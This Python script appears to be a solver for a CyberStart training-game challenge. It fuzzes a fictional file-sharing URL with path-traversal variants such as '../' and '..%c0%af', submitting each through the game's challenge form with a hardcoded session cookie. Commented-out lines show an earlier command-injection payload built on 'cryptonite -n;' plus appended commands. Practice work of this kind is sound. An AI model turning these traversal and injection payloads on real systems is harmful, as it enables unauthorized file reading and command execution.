#!/usr/bin/env python3
import requests
import sys
from tqdm import tqdm

session = requests.Session()


response = session.get(
    "https://game.joincyberstart.com/base-headquarters",
    cookies={"Cyber_Protection_Agency": "etkvb9vaaga0sh02mb010p9clp"},
)

import re


def run(url):
    # print(command)
    challenge_url = f"https://game.joincyberstart.com/challenge?base=1&level=12&challenge=4&csrf={csrf_base}"

    response3 = session.post(
        challenge_url,
        cookies={"Cyber_Protection_Agency": "etkvb9vaaga0sh02mb010p9clp"},
        data={"url": url},
    )

    res_parsed = re.search(r'"msg-display">(.*?)<\/div>', response3.text)
    try:
        response = res_parsed.group(1)
        print(url)
        if response != "Error: invalid URL.":
            print(response)
    except Exception:
        print(url)
        print("ERROR on url")


matches = re.search(r'csrf=(.*?)"', response.text)
csrf_base = matches.group(1)
"""
# print(csrf_base)
if len(sys.argv) == 1:
    command = input("cmd > ")
else:
    command = " ".join(sys.argv[1:])
"""

base_url = "http://www.easy-filebox.com/u/2374682/account/files"
possible_adds = [
    "../",
    "../../",
    "../..",
    "..",
    "./",
    ".",
    "../../..",
    "../../../",
    "..%c0%af",
    "%2F..%2F..",
    "%2F..",
]

base_url_split = [
    "http://www.easy-filebox.com/",
    "u/",
    "2374682/",
    "account/",
    "files/",
]

possible_bases = []
for i in range(len(base_url_split)):
    a_url = "".join(base_url_split[: i + 1])
    possible_bases.append(a_url)
    possible_bases.append(a_url + "?file=")
    possible_bases.append(a_url + "?page=")
    possible_bases.append(a_url + "?f=")
    if a_url[-1] == "/" and a_url != "http://www.easy-filebox.com/":
        possible_bases.append(a_url[:-1] + "?file=")
        possible_bases.append(a_url[:-1] + "?page=")
        possible_bases.append(a_url[:-1] + "?f=")
        possible_bases.append(a_url[:-1])

for possible_base in possible_bases:
    for possible_add in possible_adds:
        new_url = possible_base + possible_add
        run(new_url)
"""
commands = commands.strip().split("\n")
commands2 = []
for i in range(len(commands)):
    commands2.append("cryptonite -n" + commands[i])

commands.extend(commands2)
for payload in tqdm(commands2):
    run(payload)
"""
# run("cryptonite -n;" + command)
# print(response3.text)
